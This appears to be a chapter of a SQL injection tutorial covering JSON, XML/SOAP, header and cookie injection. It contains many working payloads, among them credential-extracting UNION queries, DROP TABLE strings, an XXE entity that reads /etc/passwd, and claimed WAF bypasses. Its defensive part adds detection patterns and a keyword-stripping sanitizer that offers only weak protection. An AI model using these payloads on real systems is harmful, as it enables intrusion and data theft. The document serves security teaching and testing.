# 13 - Injection in Alternative Contexts

## Overview

SQL injection is not limited to traditional form inputs and URL parameters. Modern applications use various data formats and transmission methods that can also be vulnerable to injection attacks. This guide covers SQL injection in JSON, XML, HTTP headers, cookies, and other alternative contexts.

## JSON Context SQL Injection

### Understanding JSON-Based SQL Injection

Modern APIs frequently use JSON for data transmission. When backend code dynamically constructs SQL queries using JSON values without proper sanitization, injection vulnerabilities emerge.

### Vulnerable JSON Structures

**Example 1: Direct Property Injection**

```json
{
  "username": "admin'--",
  "password": "password123"
}
```

**Backend Processing:**

```php
$data = json_decode($input);
$query = "SELECT * FROM users WHERE username = '{$data->username}'";
```

**Result:** Classic injection via JSON property value.

### Nested JSON Injection

**Example 2: Deeply Nested Payloads**

```json
{
  "user": {
    "profile": {
      "name": "'; DROP TABLE users;--"
    }
  }
}
```

**Backend Processing:**

```javascript
const userName = req.body.user.profile.name
const query = `SELECT * FROM users WHERE name = '${userName}'`
```

### Array-Based Injection

**Example 3: JSON Arrays**

```json
{
  "ids": [1, 2, "3' OR '1'='1"]
}
```

**Backend Processing:**

```php
$ids = json_decode($input)->ids;
$idList = implode(',', $ids);
$query = "SELECT * FROM products WHERE id IN ($idList)";
```

### Detection in JSON APIs

**Test Payloads:**

```json
{
  "search": "test'",
  "query": "test\"",
  "id": "1 AND 1=1",
  "filter": "'; SELECT pg_sleep(5);--"
}
```

**Indicators:**

- HTTP 500 errors after JSON submission
- Unexpected query results
- Time delays in JSON API responses

### Exploitation Techniques

**Technique 1: Property Value Injection**

```json
POST /api/users/search HTTP/1.1
Content-Type: application/json

{
  "name": "' UNION SELECT username,password FROM admin--"
}
```

**Technique 2: Boolean Blind via JSON**

```json
{
  "product_id": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM admin) > 0 THEN 1 ELSE 0 END) = 1--"
}
```

**Technique 3: Time-Based Blind in JSON**

```json
{
  "timestamp": "2024-01-01' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
}
```

### Database-Specific JSON Payloads

**PostgreSQL (JSON Functions):**

```json
{
  "data": "test' AND (SELECT pg_sleep(5) FROM json_array_elements('[1]')) IS NULL--"
}
```

**MySQL (JSON Extract):**

```json
{
  "config": "test' AND JSON_EXTRACT((SELECT SLEEP(5)),'$') IS NULL--"
}
```

**MSSQL (JSON_VALUE):**

```json
{
  "settings": "test'; WAITFOR DELAY '0:0:5'--"
}
```

## JSON SQL Operators for WAF Bypass

Modern databases support JSON operators that WAFs often fail to parse. This creates a bypass vector by using JSON syntax that databases understand but WAFs do not.

### Why JSON Operators Bypass WAFs

WAF parsers typically lack JSON operator support while databases have had JSON support since 2012+. This mismatch allows payloads like:

```sql
'{"a":1}'::jsonb @> '{"a":1}'::jsonb
```

To be valid SQL (returns true) while WAFs may not recognize it as SQL syntax.

### PostgreSQL JSON Operators

**Containment Operator (@>):**

```sql
'{"b":2}'::jsonb @> '{"b":2}'::jsonb
```

**Injection Payload:**

```sql
' AND '{"b":2}'::jsonb @> '{"b":2}'::jsonb--
```

**Is Contained By (<@):**

```sql
'{"b":2}'::jsonb <@ '{"a":1, "b":2}'::jsonb
```

**Injection Payload:**

```sql
' OR '{"x":1}'::jsonb <@ '{"x":1, "y":2}'::jsonb--
```

### MySQL JSON Functions

**JSON_EXTRACT Bypass:**

```sql
JSON_EXTRACT('{"id": 1}', '$.id') = 1
```

**Injection Payload:**

```sql
' AND JSON_EXTRACT('{"id": 1}', '$.id') = 1--
```

**JSON_CONTAINS:**

```sql
JSON_CONTAINS('{"a":1}', '{"a":1}')
```

### SQLite JSON Operators

**JSON Path Extraction (->):**

```sql
'{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7
```

**Injection Payload:**

```sql
' AND '{"a":1}' -> '$.a' = 1--
```

**JSON Extract (->>):**

```sql
'{"x":{"y":1}}' ->> '$.x.y' = 1
```

### MSSQL JSON Functions

**JSON_VALUE:**

```sql
JSON_VALUE('{"name":"test"}', '$.name') = 'test'
```

**Injection Payload:**

```sql
' AND JSON_VALUE('{"id":1}', '$.id') = 1--
```

**JSON_QUERY:**

```sql
JSON_QUERY('{"arr":[1,2]}', '$.arr')
```

### WAF Bypass Strategy

**Step 1: Identify JSON-Supporting Database**

Test with simple JSON syntax:

```sql
' AND '{"a":1}'::jsonb @> '{"a":1}'::jsonb--
```

**Step 2: Craft JSON-Based True Condition**

Replace standard `OR 1=1` with JSON equivalents:

| Standard Payload | JSON Bypass Payload                           |
| ---------------- | --------------------------------------------- |
| `' OR '1'='1`    | `' OR '{"x":1}'::jsonb @> '{"x":1}'::jsonb--` |
| `' AND 1=1--`    | `' AND JSON_EXTRACT('{"a":1}', '$.a')=1--`    |
| `' OR 1=1--`     | `' OR '{"a":1}'->>'$.a'=1--`                  |

**Step 3: Combine with Data Extraction**

```sql
' UNION SELECT username,password FROM admin WHERE '{"x":1}'::jsonb @> '{"x":1}'::jsonb--
```

### Real-World Bypass Examples

**AWS WAF Bypass (2024 Research):**

```http
GET /api/user?id=1' AND '{"a":1}'::jsonb <@ '{"a":1, "b":2}'::jsonb-- HTTP/1.1
```

**Cloudflare Bypass:**

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "test' AND JSON_EXTRACT('{\"id\":1}', '$.id')=1--"}
```

### Detection and Prevention

**For Testers:**

- [ ] Test JSON operators in injection points
- [ ] Try `::jsonb` casts in PostgreSQL contexts
- [ ] Use `->` and `->>` operators in SQLite
- [ ] Test `JSON_EXTRACT`, `JSON_VALUE` in MySQL/MSSQL
- [ ] Combine with time-based detection for blind scenarios

**For Defenders:**

```python
# Block JSON SQL operators
dangerous_patterns = [
    r'::jsonb\s*[@<>]',
    r'JSON_EXTRACT\s*\(',
    r'JSON_VALUE\s*\(',
    r'JSON_QUERY\s*\(',
    r'->>?'  # SQLite JSON paths
]
```

## XML Context SQL Injection

### Understanding XML-Based SQL Injection

SOAP APIs and XML-based web services are particularly vulnerable when user-supplied XML data is used in SQL query construction. XPath injection and SQL injection can combine for devastating effects.

### Vulnerable XML Structures

**Example 1: SOAP Request Injection**

```xml
<?xml version="1.0"?>
<soap:Envelope>
  <soap:Body>
    <GetUser>
      <Username>admin'--</Username>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

**Backend Processing:**

```java
String username = doc.getElementsByTagName("Username").item(0).getTextContent();
String query = "SELECT * FROM users WHERE username = '" + username + "'";
```

### XML External Entity (XXE) + SQL Injection Chain

**Combined Attack:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<search>
  <query>&xxe;'; DROP TABLE users;--</query>
</search>
```

### XML Attribute Injection

**Example:**

```xml
<user id="1' OR 1=1--" name="admin">
  <role>administrator</role>
</user>
```

### CDATA Section Bypass

**Using CDATA to Bypass Filters:**

```xml
<description>
  <![CDATA[test'; DELETE FROM logs;--]]>
</description>
```

### Exploitation Techniques

**Technique 1: XPath to SQL Chain**

```xml
<?xml version="1.0"?>
<query>
  <select>//user[name=''; SELECT * FROM admin--]</select>
</query>
```

**Technique 2: XML Comment Injection**

```xml
<filter>
  <!-- SQL Injection starts here -->'; DROP TABLE products;--
</filter>
```

**Technique 3: Namespace Confusion**

```xml
<user xmlns:sql="http://example.com/sql">
  <sql:name>' OR 1=1--</sql:name>
</user>
```

## HTTP Header Injection

### Vulnerable Headers

**Common Injection Points:**

| Header              | Example Payload                                   |
| ------------------- | ------------------------------------------------- |
| **User-Agent**      | `Mozilla' OR 1=1--`                               |
| **X-Forwarded-For** | `192.168.1.1'; DROP TABLE logs;--`                |
| **Referer**         | `http://example.com' UNION SELECT * FROM admin--` |
| **Cookie**          | `session=abc123' AND SLEEP(5)--`                  |
| **Accept-Language** | `en'; SELECT pg_sleep(5);--`                      |

### User-Agent Injection

**Request:**

```http
GET /api/stats HTTP/1.1
User-Agent: Mozilla/5.0' UNION SELECT username,password FROM admin--
```

**Backend Query:**

```sql
INSERT INTO analytics (user_agent, ip)
VALUES ('Mozilla/5.0' UNION SELECT username,password FROM admin--', '10.0.0.1')
```

### X-Forwarded-For Injection

**Attack for IP Logging Bypass:**

```http
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1' OR ip='127.0.0.1'--
```

**Backend Query:**

```sql
SELECT * FROM access_logs
WHERE ip = '127.0.0.1' OR ip='127.0.0.1'--'
AND timestamp > NOW() - INTERVAL 1 DAY
```

### Cookie-Based Injection

**Session Cookie Manipulation:**

```http
GET /dashboard HTTP/1.1
Cookie: session=abc123' AND (SELECT COUNT(*) FROM admin) > 0--
```

**Backend Query:**

```sql
SELECT * FROM sessions
WHERE token = 'abc123' AND (SELECT COUNT(*) FROM admin) > 0--'
```

## Cookie Injection Techniques

### Classic Cookie SQL Injection

**Authentication Bypass:**

```javascript
document.cookie = "user_id=1' OR 1=1--"
```

### JSON in Cookies

**Complex Cookie Structures:**

```
Cookie: prefs={"theme":"dark","user":"admin'--"}
```

**Backend Processing:**

```php
$prefs = json_decode($_COOKIE['prefs']);
$query = "UPDATE users SET theme = '{$prefs->theme}' WHERE user = '{$prefs->user}'";
```

### Multi-Cookie Injection

**Across Multiple Cookies:**

```http
Cookie: user=admin'; role=superuser'--
```

## Testing Methodology

### Step 1: Identify Alternative Input Vectors

Checklist for discovery:

- [ ] API endpoints accepting JSON
- [ ] SOAP/XML web services
- [ ] GraphQL endpoints (convert to SQL)
- [ ] REST endpoints with complex payloads
- [ ] WebSocket messages
- [ ] File upload metadata
- [ ] HTTP headers processed by application
- [ ] Cookie values used in queries
- [ ] Session storage mechanisms
- [ ] LocalStorage/SessionStorage synced to backend

### Step 2: Craft Context-Specific Payloads

**JSON Context:**

```bash
# Test with curl
curl -X POST http://target/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' OR 1=1--"}'
```

**XML Context:**

```bash
curl -X POST http://target/soap/service \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<query>
  <param>test&apos; OR 1=1--</param>
</query>'
```

**Header Context:**

```bash
curl http://target/page \
  -H "User-Agent: Mozilla' OR 1=1--" \
  -H "X-Forwarded-For: 127.0.0.1' UNION SELECT * FROM admin--"
```

### Step 3: Verify Injection Points

**JSON Verification:**

```json
{
  "test": "'",
  "boolean": "' AND 1=1--",
  "time": "' AND SLEEP(5)--"
}
```

**XML Verification:**

```xml
<test>
  <value>'</value>
  <boolean>' OR 1=1--</boolean>
  <time>'; SELECT pg_sleep(5);--</time>
</test>
```

### Step 4: Escalate to Data Extraction

**JSON Union Extraction:**

```json
{
  "search": "' UNION SELECT username,password FROM admin_users--"
}
```

**XML Union Extraction:**

```xml
<search>
  <keyword>aaa</keyword>
  <filter>' UNION SELECT * FROM admin--</filter>
</search>
```

## Prevention and Mitigation

### JSON Context Protection

**Parameterized JSON Processing:**

```javascript
// SECURE - Node.js with parameterized queries
app.post('/api/search', (req, res) => {
  const searchTerm = req.body.query

  // DON'T: Direct concatenation
  // const query = `SELECT * FROM users WHERE name = '${searchTerm}'`;

  // DO: Parameterized query
  const query = 'SELECT * FROM users WHERE name = ?'
  db.query(query, [searchTerm], (err, results) => {
    // Handle results
  })
})
```

**Input Validation for JSON:**

```python
import json
import re

def validate_json_input(data):
    if not isinstance(data, dict):
        return False

    for key, value in data.items():
        if isinstance(value, str):
            # Reject SQL patterns
            if re.search(r"[;'\"]|--|/\*", value):
                return False
    return True
```

### XML Context Protection

**Secure XML Processing:**

```java
// SECURE - Java with prepared statements
String username = doc.getElementsByTagName("Username").item(0).getTextContent();

PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

**XXE Prevention:**

```python
from defusedxml import ElementTree as ET

# Use defusedxml instead of standard xml library
tree = ET.parse(xml_file)  # Safe from XXE
```

### Header and Cookie Protection

**Sanitize Before Storage:**

```php
// SECURE - Sanitize headers
$userAgent = filter_input(INPUT_SERVER, 'HTTP_USER_AGENT', FILTER_SANITIZE_SPECIAL_CHARS);
$ip = filter_input(INPUT_SERVER, 'HTTP_X_FORWARDED_FOR', FILTER_VALIDATE_IP);

// Use parameterized query
$stmt = $pdo->prepare("INSERT INTO logs (ua, ip) VALUES (?, ?)");
$stmt->execute([$userAgent, $ip]);
```

**Cookie Security:**

```python
# Validate and sanitize cookie values
import re

def sanitize_cookie(value):
    # Remove SQL special characters
    return re.sub(r"[;'\"]|--|/\*|union|select|drop", "", value, flags=re.IGNORECASE)

user_id = sanitize_cookie(request.cookies.get('user_id'))
```

## Practice Exercises

### Exercise 1: JSON API Testing

**Setup:**

- REST API endpoint: `/api/products/search`
- Accepts JSON: `{"name": "product_name"}`

**Task:**

1. Identify SQL injection in the name parameter
2. Extract all product names using UNION
3. Retrieve admin credentials from users table

**Payload:**

```json
{
  "name": "' UNION SELECT username,password FROM admin--"
}
```

### Exercise 2: SOAP Service Injection

**Setup:**

- SOAP endpoint: `/soap/GetCustomer`
- Accepts XML with customer ID

**Task:**

1. Test XML element for injection
2. Use time-based blind to enumerate database
3. Extract customer data

**Payload:**

```xml
<customerId>1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) IS NULL--</customerId>
```

### Exercise 3: Header-Based Injection

**Setup:**

- Application logs User-Agent to database
- Admin panel displays user agents

**Task:**

1. Inject via User-Agent header
2. Use second-order injection (stored in logs)
3. Trigger via admin panel viewing

**Payload:**

```http
User-Agent: Mozilla/5.0' UNION SELECT password FROM admin--
```

### Exercise 4: Cookie Injection Chain

**Setup:**

- Cookie value stored and later used in query
- Preferences stored as JSON in cookie

**Task:**

1. Inject into JSON cookie value
2. Wait for cookie to be processed
3. Verify data extraction

## Detection Checklist

### For Security Testers

- [ ] Test all API endpoints with JSON payloads
- [ ] Submit XML with special characters to SOAP services
- [ ] Modify User-Agent with SQL injection patterns
- [ ] Test X-Forwarded-For with IP bypass payloads
- [ ] Inject into Cookie values
- [ ] Test Accept-Language and other less common headers
- [ ] Check for blind injection via time delays
- [ ] Verify error messages reveal database type
- [ ] Test for second-order injection via stored values
- [ ] Check GraphQL queries for SQL injection conversion

### Automated Detection

```python
import requests
import json

def test_json_injection(url):
    payloads = [
        {"param": "'"},
        {"param": "\""},
        {"param": "' OR 1=1--"},
        {"param": "'; SELECT pg_sleep(5);--"}
    ]

    for payload in payloads:
        r = requests.post(url, json=payload)
        if r.status_code == 500 or r.elapsed.total_seconds() > 5:
            print(f"Potential injection with: {payload}")
```

## Key Takeaways

1. **Modern APIs use JSON/XML** - injection vectors expanded beyond traditional forms
2. **HTTP headers processed by applications** - often overlooked injection points
3. **Cookies can contain complex data** - JSON/XML in cookies = injection risk
4. **Second-order applies to alternative contexts** - stored header/cookie values can trigger later
5. **Prevention requires context awareness** - different sanitization for different formats

## Next Step

Continue to [14 - HTTP Parameter Pollution](14-HTTP-Parameter-Pollution.md) to learn how parameter handling can create new injection vectors.
